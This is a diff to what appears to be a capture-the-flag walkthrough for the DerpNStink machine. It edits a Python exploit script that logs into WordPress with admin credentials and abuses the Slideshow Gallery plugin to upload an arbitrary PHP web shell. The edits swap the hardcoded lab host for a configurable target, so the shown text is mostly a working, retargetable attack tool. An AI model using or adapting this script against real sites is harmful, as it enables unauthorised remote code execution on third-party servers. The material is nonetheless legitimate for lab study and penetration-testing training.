@@ -52,40 +52,41 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 http://whitexploit.blogspot.com/ <- explanation about the vuln
 ```
 #!/usr/bin/env python3
-#! Exploit by byth22 - Kellvin Romano
+# Exploit by byth22 - Kellvin Romano
 import requests
 import os
+import urllib.parse
 
-def login(username,password):
+def login(username,password, target):
     cookies = {
         'wordpress_test_cookie': 'WP+Cookie+check',
     }
 
     headers = {
-        'Host': 'derpnstink.local',
+        'Host': str(urllib.parse.urlparse(target).netloc),
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate',
         'Content-Type': 'application/x-www-form-urlencoded',
         'Content-Length': '114',
-        'Origin': 'http://derpnstink.local',
+        'Origin': str(urllib.parse.urlparse(target).netloc),
         'Connection': 'close',
-        'Referer': 'http://derpnstink.local/weblog/wp-login.php?loggedout=true',
+        'Referer': target+'wp-login.php?loggedout=true',
         'Upgrade-Insecure-Requests': '1',
     }
 
-    data = 'log='+username+'&pwd='+password+'&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1'
+    data = 'log='+username+'&pwd='+password+'&wp-submit=Log+In&redirect_to'+target+'wp-admin%2F&testcookie=1'
 
     global s
     s = requests.Session()
-    return s.post('http://derpnstink.local/weblog/wp-login.php', headers=headers, cookies=cookies, data=data, verify=False)
+    return s.post(target+'wp-login.php', headers=headers, cookies=cookies, data=data, verify=False)
 
 
-def upload_shell(shell,shell_name):
+def upload_shell(shell,shell_name,target):
     global s
     headers = {
-        'Host': 'derpnstink.local',
+        'Host': str(urllib.parse.urlparse(target).netloc),
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
@@ -94,7 +95,7 @@ def upload_shell(shell,shell_name):
         'Content-Length': '1999',
         'Origin': 'http://derpnstink.local',
         'Connection': 'close',
-        'Referer': 'http://derpnstink.local/weblog/wp-admin/admin.php?page=slideshow-slides&method=save',
+        'Referer': target+'wp-admin/admin.php?page=slideshow-slides&method=save',
         'Upgrade-Insecure-Requests': '1',
     }
 
@@ -105,7 +106,7 @@ def upload_shell(shell,shell_name):
 
     data = '-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[id]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[order]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[title]"\r\n\r\nteste\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[description]"\r\n\r\nteste\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[showinfo]"\r\n\r\nnone\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[iopacity]"\r\n\r\n70\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[type]"\r\n\r\nfile\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="image_file"; filename="'+shell_name+'"\r\nContent-Type: application/x-php\r\n\r\n'+shell+'\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[image_url]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[uselink]"\r\n\r\nN\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[link]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[linktarget]"\r\n\r\nself\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="submit"\r\n\r\nSave Slide\r\n-----------------------------323205443534659833621751587321--\r\n'
 
-    response = s.post('http://derpnstink.local/weblog/wp-admin/admin.php', headers=headers, params=params,  data=data, verify=False)
+    response = s.post(target+'wp-admin/admin.php', headers=headers, params=params,  data=data, verify=False)
     print ("[!] Shell upload successfully!")
     print ("[!] The path is /wp-content/uploads/slideshow-gallery/ + shell name!")
     return True
@@ -117,13 +118,13 @@ def read_shell(shell):
     return lines
 
 def main():
-    cookie = login('admin','admin') # <- set you user and pass here
-    shell = read_shell('./shell3.php') # <- set file to upload
-    upload_shell(shell, 'shell3.php') # <- set file and u name
+    target = 'http://derpnstink.local/weblog/' # <- Set your target
+    cookie = login('admin', 'admin', target) # <- set you user and pass here
+    shell = read_shell('./shell4.php') # <- set file to upload
+    upload_shell(shell, 'shell4.php', target) # <- set file and u name
 
 
 main()
-
 ```
 
 
